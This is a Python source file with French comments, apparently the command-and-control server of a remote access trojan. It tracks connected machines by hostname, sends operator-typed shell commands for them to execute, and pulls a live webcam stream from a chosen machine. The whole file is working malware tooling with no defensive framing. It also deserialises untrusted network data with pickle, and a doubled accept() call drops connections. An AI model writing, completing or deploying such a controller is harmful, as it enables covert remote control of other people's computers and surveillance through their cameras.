import socket
import threading
import cv2
import struct
import pickle

HOST = '0.0.0.0'
PORT = 669



clients = {}
clients_lock = threading.Lock()

def handle_client(client_socket, client_address):
    try:
        hostname = client_socket.recv(1024).decode()
        with clients_lock:
            clients[client_socket] = hostname
        print(f"[+] Nouvelle connexion de {hostname} ({client_address[0]}:{client_address[1]})")
        
        while True:
            client_socket.send(b'ping')
            response = client_socket.recv(1024)
            if not response:
                raise Exception("Connection lost")
            threading.Event().wait(1)
    except Exception as e:
        print(f"[-] Erreur avec {hostname}: {str(e)}")
        with clients_lock:
            if client_socket in clients:
                del clients[client_socket]
        client_socket.close()
        print(f"[-] Connexion perdue avec {hostname}")

def list_clients():
    with clients_lock:
        if not clients:
            print("Aucun client connecté.")
        else:
            for i, (client_socket, hostname) in enumerate(clients.items()):
                print(f"{i}: {hostname}")







def stream_camera():
    server_ip = '0.0.0.0'  # Laisser '0.0.0.0' pour accepter toutes les connexions
    server_port = 670
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((server_ip, server_port))
    server_socket.listen(5)
    print('En attente de connexion...')

    # Accepter la connexion
    conn, addr = server_socket.accept()
    print(f'Connexion acceptée de {addr}')

    data = b""
    payload_size = struct.calcsize("L")
    while True:
        # Recevoir la taille du message
        while len(data) < payload_size:
            packet = conn.recv(4096)
            if not packet:
                break
            data += packet
        packed_msg_size = data[:payload_size]
        data = data[payload_size:]
        msg_size = struct.unpack("L", packed_msg_size)[0]

        # Recevoir la frame
        while len(data) < msg_size:
            data += conn.recv(4096)

        frame_data = data[:msg_size]
        data = data[msg_size:]

        # Désérialiser l'image
        frame = pickle.loads(frame_data)

        # Affichage
        cv2.imshow('Serveur - Streaming', frame)

        if cv2.waitKey(1) & 0xFF == ord('q'):
            break

    conn.close()
    server_socket.close()
    cv2.destroyAllWindows()






def connect_to_client(client_id):
    with clients_lock:
        if 0 <= client_id < len(clients):
            client_socket = list(clients.keys())[client_id]
            hostname = clients[client_socket]
    
    print(f"Connecté à {hostname}")
    
    while True:
        cmd = input(f"{hostname}> ").strip()
        if cmd.lower() == 'quit':
            break
        elif cmd.startswith('cmd '):
            command = cmd[4:]
            try:
                client_socket.send(b'cmd')
                client_socket.send(command.encode())
                response = b""
                while True:
                    chunk = client_socket.recv(4096)
                    if not chunk:
                        break
                    response += chunk
                    if len(chunk) < 4096:
                        break
                print(response.decode(errors='replace'))
            except Exception as e:
                print(f"Erreur lors de l'exécution de la commande: {str(e)}")
                break
        elif cmd == 'cam':
            #try:
                client_socket.send(b'cam')
                stream_camera()
            #except Exception as e:
            #    print(f"Erreur lors du démarrage du streaming de la caméra: {str(e)}")
            #    break
        else:
            print("Commandes disponibles : cmd <commande>, cam, quit")

    print(f"Déconnexion de {hostname}")



















def main_menu():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    server.listen(5)
    print(f"[*] Écoute sur {HOST}:{PORT}")

    threading.Thread(target=lambda: [server.accept() and threading.Thread(target=handle_client, args=server.accept()).start() for _ in iter(int, 1)], daemon=True).start()

    while True:
        cmd = input("Menu> ").strip().lower()
        if cmd == 'list':
            list_clients()
        elif cmd.startswith('connect '):
            try:
                client_id = int(cmd.split()[1])
                connect_to_client(client_id)
            except (ValueError, IndexError):
                print("Commande invalide. Utilisation : connect <id>")
        elif cmd == 'quit':
            break
        else:
            print("Commandes disponibles : list, connect <id>, quit")

    server.close()

if __name__ == "__main__":
    main_menu()